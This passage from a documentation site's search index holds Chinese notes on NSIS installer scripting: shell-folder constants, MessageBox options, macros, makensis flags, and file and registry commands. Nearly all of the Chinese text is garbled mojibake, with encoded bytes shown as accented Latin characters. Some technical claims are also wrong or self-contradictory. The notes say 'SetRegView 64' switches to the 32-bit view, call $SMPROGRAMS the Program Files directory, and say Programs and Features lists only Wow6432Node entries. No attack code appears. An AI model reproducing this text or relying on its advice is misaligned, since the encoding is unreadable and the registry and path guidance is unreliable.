Documentsã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 ä¸” Internet Explorer 4 æ²¡æœ‰å®‰è£…æ—¶æ— æ•ˆã€‚ $SENDTO è¯¥ç›®å½•åŒ…å«äº†\"å‘é€åˆ°\"èœå•å¿«æ·é¡¹ã€‚ $RECENT è¯¥ç›®å½•åŒ…å«äº†æŒ‡å‘ç”¨æˆ·æœ€è¿‘æ–‡æ¡£çš„å¿«æ·æ–¹å¼ã€‚ $FAVORITES è¯¥ç›®å½•åŒ…å«äº†æŒ‡å‘ç”¨æˆ·ç½‘ç»œæ”¶è—å¤¹ã€æ–‡æ¡£ç­‰çš„å¿«æ·æ–¹å¼ã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 ä¸” Internet Explorer 4 æ²¡æœ‰å®‰è£…æ—¶æ— æ•ˆã€‚ $MUSIC ç”¨æˆ·çš„éŸ³ä¹æ–‡ä»¶ç›®å½•ã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ è¯¥å¸¸é‡ä»…åœ¨ Windows XPã€ME åŠä»¥ä¸Šæ‰æœ‰æ•ˆã€‚ $PICTURES ç”¨æˆ·çš„å›¾ç‰‡ç›®å½•ã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ è¯¥å¸¸é‡ä»…åœ¨ Windows 2000ã€XPã€ME åŠä»¥ä¸Šæ‰æœ‰æ•ˆã€‚ $VIDEOS ç”¨æˆ·çš„è§†é¢‘æ–‡ä»¶ç›®å½•ã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ è¯¥å¸¸é‡ä»…åœ¨ Windows XPã€ME åŠä»¥ä¸Šæ‰æœ‰æ•ˆã€‚ $NETHOOD è¯¥ç›®å½•åŒ…å«äº†å¯èƒ½å­˜åœ¨äºæˆ‘çš„ç½‘ç»œä½ç½®ã€ç½‘ä¸Šé‚»å±…æ–‡ä»¶å¤¹çš„é“¾æ¥å¯¹è±¡ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 ä¸” Internet Explorer 4 å’Œæ´»åŠ¨æ¡Œé¢æ²¡æœ‰å®‰è£…æ—¶æ— æ•ˆã€‚ $FONTS ç³»ç»Ÿå­—ä½“ç›®å½•ã€‚ $TEMPLATES æ–‡æ¡£æ¨¡æ¿ç›®å½•ã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ $APPDATA åº”ç”¨ç¨‹åºæ•°æ®ç›®å½•ã€‚å½“å‰ç”¨æˆ·è·¯å¾„çš„æ£€æµ‹éœ€è¦ Internet Explorer 4 åŠä»¥ä¸Šã€‚æ‰€æœ‰ç”¨æˆ·è·¯å¾„çš„æ£€æµ‹éœ€è¦ Internet Explorer 5 åŠä»¥ä¸Šã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 ä¸” Internet Explorer 4 å’Œæ´»åŠ¨æ¡Œé¢æ²¡æœ‰å®‰è£…æ—¶æ— æ•ˆã€‚ $PRINTHOOD è¯¥ç›®å½•åŒ…å«äº†å¯èƒ½å­˜åœ¨äºæ‰“å°æœºæ–‡ä»¶å¤¹çš„é“¾æ¥å¯¹è±¡ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 å’Œ Windows 98 ä¸Šæ— æ•ˆã€‚ $INTERNET_CACHE Internet Explorer çš„ä¸´æ—¶æ–‡ä»¶ç›®å½•ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 å’Œ Windows NT ä¸” Internet Explorer 4 å’Œæ´»åŠ¨æ¡Œé¢æ²¡æœ‰å®‰è£…æ—¶æ— æ•ˆã€‚ $COOKIES Internet Explorer çš„ Cookies ç›®å½•ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 å’Œ Windows NT ä¸” Internet Explorer 4 å’Œæ´»åŠ¨æ¡Œé¢æ²¡æœ‰å®‰è£…æ—¶æ— æ•ˆã€‚ $HISTORY Internet Explorer çš„å†å²è®°å½•ç›®å½•ã€‚ è¯¥å¸¸é‡åœ¨ Windows 95 å’Œ Windows NT ä¸” Internet Explorer 4 å’Œæ´»åŠ¨æ¡Œé¢æ²¡æœ‰å®‰è£…æ—¶æ— æ•ˆã€‚ $PROFILE ç”¨æˆ·çš„ä¸ªäººé…ç½®ç›®å½•ã€‚ä¸€ä¸ªå…¸å‹çš„è·¯å¾„å¦‚ C:\\Documents and Settings\\Fooã€‚ è¯¥å¸¸é‡åœ¨ Windows 2000 åŠä»¥ä¸Šæœ‰æ•ˆã€‚ $ADMINTOOLS ä¸€ä¸ªä¿å­˜ç®¡ç†å·¥å…·çš„ç›®å½•ã€‚è¿™ä¸ªå¸¸é‡çš„å†…å®¹(æ‰€æœ‰ç”¨æˆ·æˆ–å½“å‰ç”¨æˆ·)å–å†³äº SetShellVarContext è®¾ç½®ã€‚é»˜è®¤ä¸ºå½“å‰ç”¨æˆ·ã€‚ è¯¥å¸¸é‡åœ¨ Windows 2000ã€ME åŠä»¥ä¸Šæœ‰æ•ˆã€‚ $RESOURCES è¯¥èµ„æºç›®å½•ä¿å­˜äº†ä¸»é¢˜å’Œå…¶ä»– Windows èµ„æº(é€šå¸¸ä¸º C:\\Windows\\Resources ä½†åœ¨è¿è¡Œæ—¶ä¼šæ£€æµ‹). è¯¥å¸¸é‡åœ¨ Windows XP åŠä»¥ä¸Šæœ‰æ•ˆã€‚ $RESOURCES_LOCALIZED è¯¥æœ¬åœ°çš„èµ„æºç›®å½•ä¿å­˜äº†ä¸»é¢˜å’Œå…¶ä»– Windows èµ„æº(é€šå¸¸ä¸º C:\\Windows\\Resources\\1033 ä½†åœ¨è¿è¡Œæ—¶ä¼šæ£€æµ‹). è¯¥å¸¸é‡åœ¨ Windows XP åŠä»¥ä¸Šæœ‰æ•ˆã€‚ $CDBURN_AREA ä¸€ä¸ªåœ¨çƒ§å½• CD æ—¶å‚¨å­˜æ–‡ä»¶çš„ç›®å½•ã€‚. è¯¥å¸¸é‡åœ¨ Windows XP åŠä»¥ä¸Šæœ‰æ•ˆã€‚ $HWNDPARENT çˆ¶çª—å£çš„åè¿›åˆ¶ HWNDã€‚ $PLUGINSDIR è¯¥è·¯å¾„æ˜¯ä¸€ä¸ªä¸´æ—¶ç›®å½•, å½“ç¬¬ä¸€æ¬¡ä½¿ç”¨ä¸€ä¸ªæ’ä»¶æˆ–ä¸€ä¸ªè°ƒç”¨ InitPluginsDir æ—¶è¢«åˆ›å»ºã€‚è¯¥æ–‡ä»¶å¤¹å½“è§£å‹åŒ…é€€å‡ºæ—¶ä¼šè¢«è‡ªåŠ¨åˆ é™¤ã€‚è¿™ä¸ªæ–‡ä»¶å¤¹çš„ç”¨æ„æ˜¯ç”¨æ¥ä¿å­˜ç»™ InstallOptions ä½¿ç”¨çš„ INI æ–‡ä»¶ã€å¯åŠ¨ç”»é¢ä½å›¾æˆ–å…¶ä»–æ’ä»¶è¿è¡Œéœ€è¦çš„æ–‡ä»¶ã€‚ éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦: $$: è¡¨ç¤º$ $\\r: è¡¨ç¤º\\r $\\n: è¡¨ç¤º\\n $\\t: è¡¨ç¤º\\t ifè¯­å¥ è¯­æ³•: ${If} $0 == 1 # do something ${EndIf} è¿˜æœ‰: ${OrIf} å³ or ${AndIf} å³ and ç‰¹æ„æµ‹è¯•äº†ä¸€ä¸‹, æ¯”è¾ƒçš„æ—¶å€™åŠ ä¸åŠ å¼•å·æ— å½±å“. æµ‹è¯•å¼•å·åˆ¤æ–­ æµ‹è¯•æºç . æ¶ˆæ¯æ¡†(MessageBox) æ˜¾ç¤ºä¸€ä¸ªåŒ…å«\"æ¶ˆæ¯æ¡†æ–‡æœ¬\"çš„æ¶ˆæ¯æ¡†ã€‚\"æ¶ˆæ¯æ¡†é€‰é¡¹åˆ—è¡¨\"å¿…é¡»ä¸º mb_option_list çš„ä¸€ä¸ªæˆ–å¤šä¸ª, å¤šä¸ªä½¿ç”¨ | æ¥éš”å¼€ è¯­æ³•: MessageBox mb_option_list messagebox_text [/SD return] [return_check jumpto [return_check_2 jumpto_2]] å„ä¸ªéƒ¨åˆ†é‡Šä¹‰: mb_option_list: MB_OK å±•ç¤º OK æŒ‰é’® MB_OKCANCEL å±•ç¤º OK, CANCEL æŒ‰é’® MB_ABORTRETRYIGNORE å±•ç¤º ABORT, RETRY, IGNORE æŒ‰é’®. é€€å‡ºã€é‡è¯•ã€å¿½ç•¥æŒ‰é’® MB_RETRYCANCEL å±•ç¤º retry, cancel æŒ‰é’® MB_YESNO å±•ç¤º yes and no buttons MB_YESNOCANCEL å±•ç¤º with yes, no, cancel buttons MB_ICONEXCLAMATION å±•ç¤º with exclamation icon. æ˜¾ç¤ºæƒŠå¹å·å›¾æ ‡ MB_ICONINFORMATION å±•ç¤º with information icon. æ˜¾ç¤ºä¿¡æ¯å›¾æ ‡ MB_ICONQUESTION å±•ç¤º with question mark icon. æ˜¾ç¤ºé—®å·å›¾æ ‡ MB_ICONSTOP å±•ç¤º with stop icon. æ˜¾ç¤ºç»ˆæ­¢å›¾æ ‡ MB_USERICON å±•ç¤º installer's icon MB_TOPMOST ç½®é¡¶ messagebox. ä½¿æ¶ˆæ¯æ¡†åœ¨æœ€å‰ç«¯æ˜¾ç¤º MB_SETFOREGROUND è®¾ç½®å‰æ™¯? (Set foreground) MB_RIGHT æ–‡æœ¬é å³å¯¹é½ MB_RTLREADING RTL reading order. RTL é˜…è¯»æ¬¡åº MB_DEFBUTTON1 Button 1 is default MB_DEFBUTTON2 Button 2 is default MB_DEFBUTTON3 Button 3 is default MB_DEFBUTTON4 Button 4 is default return_check: 0 empty left off # can be 0 (or empty, or left off) IDABORT Abort button IDCANCEL Cancel button IDIGNORE Ignore button IDNO No button IDOK OK button IDRETRY Retry button IDYES Yes button ä¼ å‚(å¦‚è¿”å›å€¼è®¾ç½®ç­‰) è¯­æ³•: Push 'xxx' Pop $0 æ ˆçš„å½¢å¼, Pushå‹æ ˆ, è·å–å°±Pop å¦‚, è¿”å›å€¼çš„å‡½æ•°: Function simpleTest MessageBox MB_OKCANCEL|MB_ICONQUESTION \\ \"ç‚¹å‡»ç¡®å®šå–æ¶ˆ\"\\ /SD IDOK \\ IDOK ok \\ IDCANCEL cancel # è¿™é‡Œç®—æ˜¯è°ƒç”¨ MessageBox åçš„å›è°ƒ ok: Push \"OK\" Goto +2 cancel: Push \"CANCEL\" FunctionEnd åœ¨.oninitä¸­è°ƒç”¨å¦‚ä¸‹: Function .onInit Call simpleTest Pop $0 # è¿™é‡Œè·å–è¿”å›å€¼ ${If} $0 == \"CANCEL\" MessageBox MB_OK|MB_ICONEXCLAMATION \"ç‚¹å‡»çš„æ˜¯å–æ¶ˆ\" ${Else} MessageBox MB_OK|MB_ICONEXCLAMATION \"ç‚¹å‡»çš„æ˜¯ç¡®å®š\" ${EndIf} FunctionEnd macros(å®) ç¼–è¯‘æ—¶, æ’å…¥ä»£ç  å®ä¸ NSIS_è‡ªå®šä¹‰å‡½æ•° ç±»ä¼¼, ä½¿ç”¨æœ‰ä¸ªè¾ƒæ˜æ˜¾çš„åŒºåˆ«æ˜¯: å®å®šä¹‰åæ”¯æŒåœ¨å‡ ä¹ä»»ä½•ä½ç½®çš„æ’å…¥ å‡½æ•°å®šä¹‰å, è‹¥è¦åŒæ—¶æ”¯æŒåœ¨å¸è½½çš„æ—¶å€™è°ƒç”¨, éœ€è¦åŠ  un. å‰ç¼€å†å†™ä¸€ä¸ª ä¾‹: ; å®šä¹‰å® !macro MyFunc UN Function ${UN}MyFunc Call ${UN}DoRegStuff ReadRegStr $0 HKLM Software\\MyProgram key DetailPrint $0 FunctionEnd !macroend !insertmacro MyFunc \"\" !insertmacro MyFunc \"un.\" ç»“æœå°†ä¼šæ’å…¥ä¸¤ä¸ª, ä¸€ä¸ªç»™å®‰è£…æ—¶å€™ç”¨, ä¸€ä¸ªç»™å¸è½½æ—¶å€™ç”¨, ä¹Ÿå¯ä»¥ç›´æ¥: ; å®šä¹‰å® !macro MyFunc Call ${UN}DoRegStuff ReadRegStr $0 HKLM Software\\MyProgram key DetailPrint $0 !macroend !insertmacro MyFunc !insertmacro MyFunc æ•ˆæœä¸€è‡´. ä¸€äº›è„šæœ¬å±æ€§ NAME : è®¾ç½®å®‰è£…å™¨åç§° (æ”¯æŒå¤šä¸ª, å¤šè¯­è¨€è®¾ç½®æ—¶ä½¿ç”¨, é»˜è®¤ä½¿ç”¨ç¬¬ä¸€ä¸ª). å¦‚: Name \"Foo & Bar\" \"Foo && Bar\" InstallDir : è®¾ç½®é»˜è®¤çš„å®‰è£…è·¯å¾„ OutFile : æ‰“å¥½çš„exeåŒ…è¾“å‡ºè·¯å¾„(åŒ…å«æ–‡ä»¶å) ShowInstDetails : å€¼ä¸º show è¡¨ç¤ºæ˜¾ç¤ºå®‰è£…è¯¦ç»†ä¿¡æ¯ ShowUnInstDetails : å€¼ä¸º show è¡¨ç¤ºæ˜¾ç¤ºå¸è½½è¯¦ç»†ä¿¡æ¯ BrandingText : å·¦ä¸‹è§’æç¤ºä¿¡æ¯ (ä¸€èˆ¬æ˜¯ å“ç‰Œ/å…¬å¸ åç§°) ä¸€äº›é€šç”¨å±æ€§, ç¼–è¯‘æ ‡å¿—, ç‰ˆæœ¬ä¿¡æ¯: instattribs","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Grammatical-specification.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Grammatical-specification.html"},{"title":"makensisæŒ‡ä»¤","text":"ä½¿ç”¨nsisè„šæœ¬å‘½ä»¤è¡Œæ‰“åŒ… å‰ç½®, è®¾ç½®å¥½ç¯å¢ƒå˜é‡: NSISDIR NISI å®‰è£…ç›®å½•, ä¸å¯åœ¨è„šæœ¬å®šä¹‰çš„ ${NSISDIR} ä¸€è‡´ NSISCONFDIR NISI é…ç½®æ–‡ä»¶ç›®å½• APPDATA(windows) / HOME(not windows) åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶ è¯­æ³•: makensis [ option | script.nsi | - ] [...] é€‰é¡¹è¯´æ˜: /LICENSE æ˜¾ç¤ºlicenseä¿¡æ¯ /V=<[0-4]> ç›¸å…³ä¿¡æ¯è¾“å‡º. åªèƒ½æ˜¯ 0-4 0 ä¸è¾“å‡º 1 ä»…errorä¿¡æ¯ 2 warnings and errors 3 info, warnings, and errors 4 æ‰€æœ‰çº§åˆ«ä¿¡æ¯ /P=<[0-5]> è®¾ç½®å®‰è£…ä¼˜å…ˆçº§. åªèƒ½æ˜¯ 0-5 0 ç©ºé—²(idle)æ—¶å®‰è£… 1 below normal 2 normal (default) 3 above normal 4 high 5 realtime. å®æ—¶å®‰è£…? /O=<filename> å°†è¾“å‡ºå†™å…¥åˆ° filename (ä¸è¾“å‡ºåˆ°å±å¹•). /LAUNCH executes the generated installer. æ‰§è¡Œç”Ÿæˆçš„å®‰è£…ç¨‹åº /PAUSE makes makensis pause before quitting, which is useful when executing directly from Windows. åœ¨é€€å‡ºä¹‹å‰æš‚åœ /NOCONFIG disables inclusion of nsisconf.nsh. Without this parameter, installer defaults are set from nsisconf.nsh. /CMDHELP prints basic usage information for command (if specified), or all commands (if command is not specified). /HDRINFO prints information about which options were used to compile makensis. /NOCD disables the current directory change to that of the .nsi file /INPUTCHARSET allows you to specify a specific codepage for files without a BOM. (ACP|OEM|CP#|UTF8|UTF16<LE|BE>) /OUTPUTCHARSET allows you to specify the codepage used by stdout when the output is redirected. (ACP|OEM|CP#|UTF8[SIG]|UTF16<LE|BE>[BOM]) /PPO, /SAFEPPO will only run the preprocessor and print the result to stdout. The safe version will not execute instructions like !appendfile or !system. !packhdr and !finalize are never executed. /WX treats warnings as errors /D switch one or more times will add to symbols to the globally defined list (See !define). /X switch one or more times will execute the code you specify following it. Example: \"/XAutoCloseWindow false\" Specifying a dash (-) for the script name will tell makensis to use the standard input as a source. æ³¨è§£ æ³¨æ„å‚æ•°é¡ºåº å®˜ç½‘: usage","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Makensis.html","loc":"/yq-doc-source-docs-operating-system-Windows-Windows-execution-file-packaging-NSIS-Makensis.html"},{"title":"nsis æŒ‡ä»¤","text":"æ–‡ä»¶ã€ç›®å½•æ“ä½œ FileOpen/FileWrite/FileClose å¯ç”¨äºåˆ›å»ºæ–‡ä»¶, å†™å…¥æ–‡ä»¶: FileOpen $9 apachesrvin.bat w ;Opens a Empty File and fills it FileWrite $9 \"cd $INSTDIR\\apache$\\r$\\n\" FileWrite $9 \"apache -n Apache -k install$\\r$\\n\" FileWrite $9 \"net start Apache$\\r$\\n\" FileWrite $9 \"exit$\\r$\\n\" FileClose $9 ;Closes the filled file ä¸Šé¢è¿™æ®µä»£ç é‡Œçš„ $9 è¡¨ç¤ºåˆ›å»ºçš„æ–‡ä»¶æŒ‡é’ˆèµ‹ç»™æ­¤å˜é‡, ç±»ä¼¼: $9 = open('apachesrvin.bat') File ä½œç”¨: é‡Šæ”¾æ–‡ä»¶åˆ°å½“å‰è¾“å‡ºè·¯å¾„ã€‚ é€‰é¡¹: /nonfatal ä¸”å½“æ–‡ä»¶æœªæ‰¾åˆ°æ—¶ä½¿ç”¨è­¦å‘Šæ¥ä»£æ›¿é”™è¯¯ /a è¢«æ·»åŠ çš„æ–‡ä»¶çš„å±æ€§å°†ä¼šä¿æŒ /r åŒ¹é…çš„æ–‡ä»¶å°†ä¼šåœ¨å­ç›®å½•é‡Œè¢«é€’å½’çš„æœç´¢ã€‚å¦‚æœç›®å½•ååŒ¹é…åˆ™æ‰€æœ‰åŒ…å«çš„å†…å®¹éƒ½ä¼šè¢«é€’å½’æ·»åŠ , ç›®å½•ç»“æ„ä¹Ÿä¼šè¢«ä¿æŒ /x æ’é™¤æ–‡ä»¶æˆ–ç›®å½• Delete ä½œç”¨: ä»ç›®æ ‡ç³»ç»Ÿåˆ é™¤æ–‡ä»¶ ä¾‹, åˆ é™¤æ–‡ä»¶: Delete \"$SMPROGRAMS\\Test.exe\" Rename ä½œç”¨: æŠŠæºæ–‡ä»¶é‡å‘½åä¸ºç›®æ ‡æ–‡ä»¶ ä¾‹, é‡å‘½åæ–‡ä»¶: Rename $INSTDIR\\file1 $INSTDIR\\file2 CreateDirectory ä½œç”¨: åˆ›å»º (é€’å½’åˆ›å»º) æŒ‡å®šçš„ç›®å½•ã€‚å½“ç›®å½•ä¸èƒ½åˆ›å»ºæ—¶ä¼šæ”¾ç½®ä¸€ä¸ªé”™è¯¯æ ‡è®°ã€‚ä½ ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ ä¾‹, åœ¨é»˜è®¤Program Filesç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªTempç›®å½•: CreateDirectory \"$SMPROGRAMS\\Temp\" RMDir ä½œç”¨: åˆ é™¤ç›®å½• ä¾‹, åˆ é™¤ResourcesåŠå…¶å­ç›®å½•: RMDir /r $INSTDIR\\Resources SetOutPath ä½œç”¨: è®¾ç½®è¾“å‡ºè·¯å¾„($OUTDIR)ä¸”å½“è·¯å¾„ä¸å­˜åœ¨æ—¶åˆ›å»º(éœ€è¦æ—¶ä¼šé€’å½’åˆ›å»º)ã€‚å¿…é¡»ä¸ºç»å¯¹è·¯å¾„å, é€šå¸¸éƒ½ä½¿ç”¨ $INSTDIRã€‚ ä¾‹, å°†ç”¨æˆ·å®šä¹‰çš„è§£å‹è·¯å¾„ä½œä¸ºè¾“å‡ºç›®å½•: SetOutPath $INSTDIR CreateShortCut ä½œç”¨: åˆ›å»ºå¿«æ·æ–‡ä»¶.lnk ç›®æ ‡æ–‡ä»¶ ä¾‹, è®¾ç½®Test.exeçš„å¿«æ·æ–¹å¼Test.lnk, å›¾æ ‡ä¸ºTest.ico: CreateShortCut \"$DESKTOP\\Test.lnk\" \"$DESKTOP\\Test.exe\" \"$DESKTOP\\Icon\\Test.ico\" æ³¨å†Œè¡¨æ“ä½œ WriteRegStr/WriteRegExpandStr å…³äºWin64ä¸‹å†™æ³¨å†Œè¡¨æ—¶å€™çš„ä¸€äº›é—®é¢˜ å½“ä½¿ç”¨nsiså†™å…¥åˆ° HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall ä¸‹æ—¶, ç³»ç»Ÿçš„æ³¨å†Œè¡¨ç¼–è¾‘å™¨å¹¶ä¸ä¼šæ˜¾ç¤ºæ­¤é¡¹, è€Œæ˜¯æ˜¾ç¤ºåœ¨ HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall , è¿™æ˜¯å› ä¸ºæ§åˆ¶é¢æ¿çš„\"ç¨‹åºå’ŒåŠŸèƒ½\"æ˜¯åŸºäºæ³¨å†Œè¡¨åå°„æ¥å®ç°çš„ã€‚å¯¹äº64ä½ç³»ç»Ÿ,å®ƒåªæ˜¾ç¤º Wow6432Node ä¸‹çš„æ³¨å†Œè¡¨é”®,è€Œä¸æ˜¾ç¤ºåŸç”Ÿçš„64ä½é”®. è¦è®©å¸è½½ä¿¡æ¯æ˜¾ç¤ºåœ¨æ§åˆ¶é¢æ¿ä¸­,nsis åœ¨ 64ä½ç³»ç»Ÿä¸‹éœ€è¦åŒæ—¶å†™å…¥ Wow6432Node ä¸‹çš„å¯¹åº”é”®ã€‚ä¸€èˆ¬çš„æ–¹æ³•æ˜¯: é¦–å…ˆå†™å…¥åŸç”Ÿé”®,å¦‚ HKLMSoftwareMicrosoftWindowsCurrentVersionUninstallApp è°ƒç”¨ SetRegView 64 æ¥åˆ‡æ¢åˆ° 32ä½è§†å›¾ å†™å…¥ Wow6432Node\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\App è°ƒç”¨ SetRegView last æ¢å¤æ³¨å†Œè¡¨è§†å›¾ ç»§ç»­å†™å…¥åŸç”Ÿçš„å…¶ä»–é”® ä½œç”¨: æŠŠå­—ç¬¦ä¸²å†™å…¥æ³¨å†Œè¡¨ã€‚æ ¹é”®å¿…é¡»ä¸ºä¸‹é¢åˆ—è¡¨ä¹‹ä¸€: HKCR æˆ– HKEY_CLASSES_ROOT HKLM æˆ–HKEY_LOCAL_MACHINE HKCU æˆ–HKEY_CURRENT_USER HKU æˆ–HKEY_USERS HKCC æˆ–HKEY_CURRENT_CONFIG HKDD æˆ–HKEY_DYN_DATA HKPD æˆ–HKEY_PERFORMANCE_DATA SHCTX æˆ–SHELL_CONTEXT å¦‚æœå­—ä¸²ä¸èƒ½å†™å…¥æ³¨å†Œè¡¨åˆ™æ”¾ç½®ä¸€ä¸ªé”™è¯¯çš„æ ‡è®°ã€‚ å­—ä¸²çš„ç±»å‹ä¸º REG_SZ å¯¹åº” WriteRegStr, æˆ– REG_EXPAND_STR å¯¹åº” WriteRegExpandStrã€‚ å¦‚æœæ³¨å†Œè¡¨é”®ä¸å­˜åœ¨åˆ™ä¼šè‡ªåŠ¨åˆ›å»ºã€‚ ä¾‹, å°†ç¨‹åºä¿¡æ¯å†™å…¥æ³¨å†Œè¡¨: Section -Post WriteUninstaller \"$INSTDIR\\uninst.exe\" WriteRegStr HKLM \"PRODUCT_DIR_REGKEY\" \"\" \"$INSTDIR\\Test.exe\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayName\" \"$(&#94;Name)\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"UninstallString\" \"$INSTDIR\\uninst.exe\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayIcon\" \"$INSTDIR\\Test.exe\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"DisplayVersion\" \"${PRODUCT_VERSION}\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"URLInfoAbout\" \"${PRODUCT_WEB_SITE}\" WriteRegStr PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" \"Publisher\" \"${PRODUCT_PUBLISHER}\" SectionEnd ReadRegDWORD/ReadRegStr ä½œç”¨: è¯»å–æ³¨å†Œè¡¨ä¿¡æ¯ ä¾‹, åœ¨æ³¨å†Œè¡¨ä¸­è¯»å–.net ç‰ˆæœ¬: Function GetNetFrameworkVersion Push $1 Push $0 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\" \"Version\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5\" \"Version\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0\\Setup\" \"InstallSuccess\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.0\\Setup\" \"Version\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v2.0.50727\" \"Version\" StrCmp $1 \"\" +1 +2 StrCpy $1 \"2.0.50727.832\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v1.1.4322\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v1.1.4322\" \"Version\" StrCmp $1 \"\" +1 +2 StrCpy $1 \"1.1.4322.573\" StrCmp $0 1 KnowNetFrameworkVersion +1 ReadRegDWORD $0 HKLM \"SOFTWARE\\Microsoft\\.NETFramework\\policy\\v1.0\" \"Install\" ReadRegDWORD $1 HKLM \"SOFTWARE\\Microsoft\\.NETFramework\\policy\\v1.0\" \"Version\" StrCmp $1 \"\" +1 +2 StrCpy $1 \"1.0.3705.0\" StrCmp $0 1 KnowNetFrameworkVersion +1 StrCpy $1 \"not .NetFramework\" KnowNetFrameworkVersion: Pop $0 Exch $1 FunctionEnd DeleteRegKey ä½œç”¨: åˆ é™¤ä¸€ä¸ªæ³¨å†Œè¡¨é”®ã€‚å¦‚æœæŒ‡å®šäº† /ifempty, åˆ™è¯¥æ³¨å†Œè¡¨é”®ä»…å½“å®ƒæ— å­é”®æ—¶æ‰ä¼šè¢«åˆ é™¤(å¦åˆ™, æ•´ä¸ªæ³¨å†Œè¡¨é”®å°†è¢«åˆ é™¤). æœ‰æ•ˆçš„æ ¹é”®å€¼åœ¨åé¢çš„ WriteRegStr åˆ—å‡ºã€‚å¦‚æœè¯¥é”®ä¸èƒ½è¢«åˆ é™¤(æˆ–å¦‚æœå®ƒä¸å­˜åœ¨)åˆ™ä¼šæ”¾ç½®ä¸€ä¸ªé”™è¯¯çš„æ ‡è®°ã€‚ ä¾‹, æ¸…é™¤æ³¨å†Œè¡¨ä¿¡æ¯: DeleteRegKey PRODUCT_UNINST_ROOT_KEY \"{PRODUCT_UNINST_KEY}\" DeleteRegKey HKLM \"${PRODUCT_DIR_REGKEY}\" SetAutoClose true INIæ–‡ä»¶æ“ä½œ ReadINIStr è¯­æ³•: ReadINIStr ç”¨æˆ·å˜é‡(è¾“å‡º) INIæ–‡ä»¶ åŒºæ®µ é¡¹ ä½œç”¨: è¯»å–INIæ–‡ä»¶ã€‚ä» \"INIæ–‡ä»¶\" çš„ \"åŒºæ®µ\" 